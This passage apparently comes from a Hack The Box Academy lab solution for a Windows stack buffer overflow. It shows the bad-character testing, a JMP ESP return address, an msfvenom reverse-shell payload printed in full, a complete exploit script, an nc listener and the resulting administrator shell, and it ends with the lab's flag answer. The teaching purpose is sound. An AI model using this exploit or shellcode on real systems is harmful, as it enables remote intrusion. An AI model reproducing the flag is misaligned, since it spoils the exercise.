    0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,
    0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
    0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F,
    0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47,
    0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,
    0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,
    0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,
    0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67,
    0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,
    0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77,
    0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F,
    0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
    0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F,
    0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97,
    0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F,
    0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7,
    0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF,
    0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7,
    0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF,
    0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7,
    0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF,
    0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7,
    0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF,
    0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7,
    0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF,
    0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7,
    0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF])
    offset = 469
    buffer = b"A" * offset
    EIP = b"B" * 4
    payload = buffer + EIP + characters
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

badCharacters()
```

![[HTB Solutions/Others/z. images/40b6d04d1f5e6fa38a9c6bee385ff01d_MD5.jpg]]

Within `x32dbg`, students need to click the `Reset` button so that it closes the crashed `win32bof` binary and run it again. Subsequently, students need to run the Python script, to then compare the input in memory to all characters using `ERC`. First, students need to copy the address of `ESP`, which is `00DBFB48`:

![[HTB Solutions/Others/z. images/1390724aec60288550cc15247dc68c57_MD5.jpg]]

Then, students need to use the `--compare` option of `ERC` on the `ESP` address and the location of the `.bin` file that contains all characters generated earlier (most importantly not the one that includes `0x00`, if students are using the same connection to the Windows VM without reset, the file name will be `ByteArray_2.bin` instead of `ByteArray_1.bin`):

Code: powershell

```powershell
ERC --compare 00DBFB48 C:\Users\htb-student\Desktop\ByteArray_1.bin
```

Students will notice that `A` (i.e., `0x0A`) is a bad character since it truncated the rest of the input:

![[HTB Solutions/Others/z. images/66ffe50bbe11fd329fff0bb2f449b973_MD5.jpg]]

Now, students need to repeat the same steps above one more time. First, students need to exclude the bad characters `0x00` and `0x0A` from the byte array that `ERC` generates:

Code: powershell

```powershell
ERC --bytearray -bytes 0x00,0x0A
```

![[HTB Solutions/Others/z. images/c2a3867104510d137592969f09c1b1ed_MD5.jpg]]

Then, students need to use the same Python script as before, however, they also need to remove `0x00` and `0x0A`:

Code: python

```python
import socket
from struct import pack

IP = "127.0.0.1"
port = 21449

def badCharacters():
    characters = bytes([0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,
    0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
    0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,
    0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
    0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F,
    0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47,
    0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,
    0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,
    0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,
    0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67,
    0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,
    0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77,
    0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F,
    0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
    0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F,
    0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97,
    0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F,
    0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7,
    0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF,
    0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7,
    0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF,
    0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7,
    0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF,
    0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7,
    0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF,
    0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7,
    0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF,
    0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7,
    0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF])
    offset = 469
    buffer = b"A" * offset
    EIP = b"B" * 4
    payload = buffer + EIP + characters
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

badCharacters()
```

![[HTB Solutions/Others/z. images/454b8ac5491d78b509b759f20fa7e7aa_MD5.jpg]]

Within `x32dbg`, students need to click the `Reset` button so that it closes the crashed `win32bof` binary and run it again. Subsequently, students need to run the Python script, to then compare the input in memory to all characters using `ERC`. First, students need to copy the address of `ESP`, which is `00EDFB48`:

![[HTB Solutions/Others/z. images/23be684880846d64261d6eba75507439_MD5.jpg]]

Then, students need to use the `--compare` option of `ERC` on the `ESP` address and the location of the `.bin` file that contains all characters generated earlier (most importantly not the ones that include `0x00` nor `0x0A`, if students are using the same connection to the Windows VM without reset, the file name will be `ByteArray_3.bin` instead of `ByteArray_2.bin`):

Code: powershell

```powershell
ERC --compare 00EDFB48 C:\Users\htb-student\Desktop\ByteArray_2.bin
```

Students will notice that `D` (i.e., `0x0D`) is a bad character since it truncated the rest of the input:

![[HTB Solutions/Others/z. images/d3ff94da9995fcab16063ff1090d210d_MD5.jpg]]

Subsequently, students need to exclude the bad characters `0x00`, `0x0A`, and `0X0D` from the byte array that `ERC` generates:

Code: powershell

```powershell
ERC --bytearray -bytes 0x00,0x0A,0x0D
```

![[HTB Solutions/Others/z. images/086616f33e7142d21d17110c46577383_MD5.jpg]]

Then, students need to use the same Python script as before, however, they also need to remove `0x00`, `0x0A`, and `0x0D`:

Code: python

```python
import socket
from struct import pack

IP = "127.0.0.1"
port = 21449

def badCharacters():
    characters = bytes([0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0B, 0x0C, 0x0E, 0x0F,
    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,
    0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
    0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,
    0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
    0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F,
    0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47,
    0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,
    0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,
    0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,
    0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67,
    0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,
    0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77,
    0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F,
    0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
    0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F,
    0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97,
    0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F,
    0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7,
    0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF,
    0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7,
    0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF,
    0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7,
    0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF,
    0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7,
    0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF,
    0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7,
    0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF,
    0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7,
    0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF])
    offset = 469
    buffer = b"A" * offset
    EIP = b"B" * 4
    payload = buffer + EIP + characters
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

badCharacters()
```

![[HTB Solutions/Others/z. images/1f4a80147a53cc5f88f8a0633806c74b_MD5.jpg]]

Within `x32dbg`, students need to click the `Reset` button so that it closes the crashed `win32bof` binary and run it again. Subsequently, students need to run the Python script, to then compare the input in memory to all characters using `ERC`. First, students need to copy the address of `ESP`, which is `0106FB48`:

![[HTB Solutions/Others/z. images/109699cffe4a45a8686908a82145f879_MD5.jpg]]

Then, students need to use the `--compare` option of `ERC` on the `ESP` address and the location of the `.bin` file that contains all characters generated earlier (most importantly not the ones that include `0x00`, `0x0A`, nor `0x0D`; if students are using the same connection to the Windows VM without reset, the file name will be `ByteArray_4.bin` instead of `ByteArray_3.bin`):

Code: powershell

```powershell
ERC --compare 0106FB48 C:\Users\htb-student\Desktop\ByteArray_3.bin
```

![[HTB Solutions/Others/z. images/7bc2bf53f97e285d220baafb6f79031b_MD5.jpg]]

Students will notice that there is no input truncation anymore, indicating that there are no more bad characters. Thus, in total, there are three bad characters that students need to exclude from the shellcode and the return address(es), which are `0x00`, `0x0A`, and `0x0D`. Subsequently, students need to find a `JMP ESP` instruction and write its address at `EIP` (using the `ESP` address method is not possible since the address contains bad characters when the binary crashes). Within `win32bof`, students need to open the `CPU` tab, right-click, and then select `Search for` -> `All Modules` -> `Command`, and search for `JMP ESP`:

![[HTB Solutions/Others/z. images/fbfd26b9d5ce9a02e12826a046e987b0_MD5.jpg]]

![[HTB Solutions/Others/z. images/2ab5405f4e9c8bce11d46b56a5ae7a0e_MD5.jpg]]

Students can use the first address `0x621014E3` as it does not contain any bad characters:

![[HTB Solutions/Others/z. images/2797f27afe7aa929f0b22d343494b40a_MD5.jpg]]

Subsequently, students need to generate shellcode for a reverse shell using `msfvenom`, excluding the bad characters `x00`, `x0A`, and `x0D`:

Code: shell

```shell
msfvenom -p 'windows/shell_reverse_tcp' LHOST=PWNIP LPORT=PWNPO -f 'python' -b '\x00\x0A\x0D'
```

```
┌─[us-academy-1]─[10.10.14.120]─[htb-ac413848@htb-7nr9onhr8m]─[~]
└──╼ [★]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.14.120 LPORT=9001 -f 'python' -b '\x00\x0A\x0D'

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1712 bytes
buf =  b""
buf += b"\xba\x64\x7e\xb4\x42\xdb\xc0\xd9\x74\x24\xf4\x58\x29"
buf += b"\xc9\xb1\x52\x31\x50\x12\x83\xc0\x04\x03\x34\x70\x56"
buf += b"\xb7\x48\x64\x14\x38\xb0\x75\x79\xb0\x55\x44\xb9\xa6"
buf += b"\x1e\xf7\x09\xac\x72\xf4\xe2\xe0\x66\x8f\x87\x2c\x89"
buf += b"\x38\x2d\x0b\xa4\xb9\x1e\x6f\xa7\x39\x5d\xbc\x07\x03"
buf += b"\xae\xb1\x46\x44\xd3\x38\x1a\x1d\x9f\xef\x8a\x2a\xd5"
buf += b"\x33\x21\x60\xfb\x33\xd6\x31\xfa\x12\x49\x49\xa5\xb4"
buf += b"\x68\x9e\xdd\xfc\x72\xc3\xd8\xb7\x09\x37\x96\x49\xdb"
buf += b"\x09\x57\xe5\x22\xa6\xaa\xf7\x63\x01\x55\x82\x9d\x71"
buf += b"\xe8\x95\x5a\x0b\x36\x13\x78\xab\xbd\x83\xa4\x4d\x11"
buf += b"\x55\x2f\x41\xde\x11\x77\x46\xe1\xf6\x0c\x72\x6a\xf9"
buf += b"\xc2\xf2\x28\xde\xc6\x5f\xea\x7f\x5f\x3a\x5d\x7f\xbf"
buf += b"\xe5\x02\x25\xb4\x08\x56\x54\x97\x44\x9b\x55\x27\x95"
buf += b"\xb3\xee\x54\xa7\x1c\x45\xf2\x8b\xd5\x43\x05\xeb\xcf"
buf += b"\x34\x99\x12\xf0\x44\xb0\xd0\xa4\x14\xaa\xf1\xc4\xfe"
buf += b"\x2a\xfd\x10\x50\x7a\x51\xcb\x11\x2a\x11\xbb\xf9\x20"
buf += b"\x9e\xe4\x1a\x4b\x74\x8d\xb1\xb6\x1f\xb8\x4f\xb6\xa7"
buf += b"\xd4\x4d\xc6\x74\x0c\xdb\x20\x10\x5e\x8d\xfb\x8d\xc7"
buf += b"\x94\x77\x2f\x07\x03\xf2\x6f\x83\xa0\x03\x21\x64\xcc"
buf += b"\x17\xd6\x84\x9b\x45\x71\x9a\x31\xe1\x1d\x09\xde\xf1"
buf += b"\x68\x32\x49\xa6\x3d\x84\x80\x22\xd0\xbf\x3a\x50\x29"
buf += b"\x59\x04\xd0\xf6\x9a\x8b\xd9\x7b\xa6\xaf\xc9\x45\x27"
buf += b"\xf4\xbd\x19\x7e\xa2\x6b\xdc\x28\x04\xc5\xb6\x87\xce"
buf += b"\x81\x4f\xe4\xd0\xd7\x4f\x21\xa7\x37\xe1\x9c\xfe\x48"
buf += b"\xce\x48\xf7\x31\x32\xe9\xf8\xe8\xf6\x19\xb3\xb0\x5f"
buf += b"\xb2\x1a\x21\xe2\xdf\x9c\x9c\x21\xe6\x1e\x14\xda\x1d"
buf += b"\x3e\x5d\xdf\x5a\xf8\x8e\xad\xf3\x6d\xb0\x02\xf3\xa7"
```

Then, students need to spawn the target machine and use its address in the Python script that will buffer overflow the remote target and trigger the reverse shell (students no longer need the Windows VM, as the Python exploit script can be run from Pwnbox/`PMVPN`):

Code: python

```python
import socket
from struct import pack
IP = "STMIP"
port = 21449

def exploit():
    buf = b""
    buf += b"\xba\x64\x7e\xb4\x42\xdb\xc0\xd9\x74\x24\xf4\x58\x29"
    buf += b"\xc9\xb1\x52\x31\x50\x12\x83\xc0\x04\x03\x34\x70\x56"
    buf += b"\xb7\x48\x64\x14\x38\xb0\x75\x79\xb0\x55\x44\xb9\xa6"
    buf += b"\x1e\xf7\x09\xac\x72\xf4\xe2\xe0\x66\x8f\x87\x2c\x89"
    buf += b"\x38\x2d\x0b\xa4\xb9\x1e\x6f\xa7\x39\x5d\xbc\x07\x03"
    buf += b"\xae\xb1\x46\x44\xd3\x38\x1a\x1d\x9f\xef\x8a\x2a\xd5"
    buf += b"\x33\x21\x60\xfb\x33\xd6\x31\xfa\x12\x49\x49\xa5\xb4"
    buf += b"\x68\x9e\xdd\xfc\x72\xc3\xd8\xb7\x09\x37\x96\x49\xdb"
    buf += b"\x09\x57\xe5\x22\xa6\xaa\xf7\x63\x01\x55\x82\x9d\x71"
    buf += b"\xe8\x95\x5a\x0b\x36\x13\x78\xab\xbd\x83\xa4\x4d\x11"
    buf += b"\x55\x2f\x41\xde\x11\x77\x46\xe1\xf6\x0c\x72\x6a\xf9"
    buf += b"\xc2\xf2\x28\xde\xc6\x5f\xea\x7f\x5f\x3a\x5d\x7f\xbf"
    buf += b"\xe5\x02\x25\xb4\x08\x56\x54\x97\x44\x9b\x55\x27\x95"
    buf += b"\xb3\xee\x54\xa7\x1c\x45\xf2\x8b\xd5\x43\x05\xeb\xcf"
    buf += b"\x34\x99\x12\xf0\x44\xb0\xd0\xa4\x14\xaa\xf1\xc4\xfe"
    buf += b"\x2a\xfd\x10\x50\x7a\x51\xcb\x11\x2a\x11\xbb\xf9\x20"
    buf += b"\x9e\xe4\x1a\x4b\x74\x8d\xb1\xb6\x1f\xb8\x4f\xb6\xa7"
    buf += b"\xd4\x4d\xc6\x74\x0c\xdb\x20\x10\x5e\x8d\xfb\x8d\xc7"
    buf += b"\x94\x77\x2f\x07\x03\xf2\x6f\x83\xa0\x03\x21\x64\xcc"
    buf += b"\x17\xd6\x84\x9b\x45\x71\x9a\x31\xe1\x1d\x09\xde\xf1"
    buf += b"\x68\x32\x49\xa6\x3d\x84\x80\x22\xd0\xbf\x3a\x50\x29"
    buf += b"\x59\x04\xd0\xf6\x9a\x8b\xd9\x7b\xa6\xaf\xc9\x45\x27"
    buf += b"\xf4\xbd\x19\x7e\xa2\x6b\xdc\x28\x04\xc5\xb6\x87\xce"
    buf += b"\x81\x4f\xe4\xd0\xd7\x4f\x21\xa7\x37\xe1\x9c\xfe\x48"
    buf += b"\xce\x48\xf7\x31\x32\xe9\xf8\xe8\xf6\x19\xb3\xb0\x5f"
    buf += b"\xb2\x1a\x21\xe2\xdf\x9c\x9c\x21\xe6\x1e\x14\xda\x1d"
    buf += b"\x3e\x5d\xdf\x5a\xf8\x8e\xad\xf3\x6d\xb0\x02\xf3\xa7"

    offset = 469
    buffer = b"A" * offset
    EIP = pack('<L', 0x621014E3)
    NOP = b"\x90" * 32
    payload = buffer + EIP + NOP + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

exploit()
```

Before running the exploit, students need to start an `nc` listener on the same port that was specified when creating the `msfvenom` payload (9001 in here):

Code: shell

```shell
nc -nvlp PWNPO
```

```
┌─[us-academy-1]─[10.10.14.120]─[htb-ac413848@htb-7nr9onhr8m]─[~]
└──╼ [★]$ nc -nvlp 9001

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

Subsequently, students need to run the Python exploit code:

Code: shell

```shell
python3 exploit.py
```

```
┌─[us-academy-1]─[10.10.14.120]─[htb-ac413848@htb-7nr9onhr8m]─[~]
└──╼ [★]$ python3 exploit.py
```

On the `nc` listener, students will notice that the reverse shell connection has been established successfully:

```
Ncat: Connection from 10.129.43.23.
Ncat: Connection from 10.129.43.23:57665.
Microsoft Windows [Version 10.0.19042.631]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
win32bof-ws02\administrator
```

At last, students need to print out the contents of the flag file "flag.txt" which is under the directory `C:\Users\Administrator\Desktop\`:

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```
```
C:\WINDOWS\system32>type C:\Users\Administrator\Desktop\flag.txt
type C:\Users\Administrator\Desktop\flag.txt

HTB{r3m073_3xpl0174710n_n1nj4}
```

Answer: `HTB{r3m073_3xpl0174710n_n1nj4}`